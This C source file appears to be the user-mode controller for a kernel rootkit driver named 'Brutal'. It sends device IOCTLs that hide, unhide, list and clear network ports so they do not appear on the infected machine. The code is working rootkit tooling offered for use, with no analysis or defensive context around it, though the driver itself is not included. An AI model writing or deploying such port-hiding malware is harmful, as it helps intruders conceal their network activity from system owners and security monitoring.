#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define MAX_PORTS 64
#define IOCTL_ADD   CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEL   CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_LIST  CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_CLEAR CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

static void
usage(void)
{
    printf("usage: ctl add <port>    hide a port\n");
    printf("       ctl del <port>    unhide a port\n");
    printf("       ctl list          show hidden ports\n");
    printf("       ctl clear         unhide everything\n");
}

int
main(int argc, char** argv)
{
#pragma warning(push)
#pragma warning(disable: 4245)
    HANDLE h;
    DWORD bytes;

    if (argc < 2) { usage(); return 0; }

    h = CreateFileA("\\\\.\\Brutal", GENERIC_READ | GENERIC_WRITE,
                    0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("error %lu: driver not loaded?\n", GetLastError());
        return 1;
    }

    if (!strcmp(argv[1], "add") && argc > 2) {
        USHORT p = (USHORT)atoi(argv[2]);
        if (!DeviceIoControl(h, IOCTL_ADD, &p, (DWORD)sizeof(p), NULL, 0UL, &bytes, NULL))
            printf("add failed (%lu)\n", GetLastError());
        else
            printf("port %u hidden\n", p);
    } else if (!strcmp(argv[1], "del") && argc > 2) {
        USHORT p = (USHORT)atoi(argv[2]);
        if (!DeviceIoControl(h, IOCTL_DEL, &p, (DWORD)sizeof(p), NULL, 0UL, &bytes, NULL))
            printf("del failed (%lu)\n", GetLastError());
        else
            printf("port %u unhidden\n", p);
    } else if (!strcmp(argv[1], "list")) {
        USHORT buf[MAX_PORTS] = {0};
        if (DeviceIoControl(h, IOCTL_LIST, NULL, 0UL, buf, (DWORD)sizeof(buf), &bytes, NULL)) {
            ULONG n = bytes / sizeof(USHORT);
            if (!n) { printf("none\n"); }
            else { for (ULONG i = 0; i < n; i++) printf("  %u\n", buf[i]); }
        } else {
            printf("list failed (%lu)\n", GetLastError());
        }
    } else if (!strcmp(argv[1], "clear")) {
        if (!DeviceIoControl(h, IOCTL_CLEAR, NULL, 0UL, NULL, 0UL, &bytes, NULL))
            printf("clear failed (%lu)\n", GetLastError());
        else
            printf("cleared\n");
    } else {
        usage();
    }

    CloseHandle(h);
#pragma warning(pop)
    return 0;
}
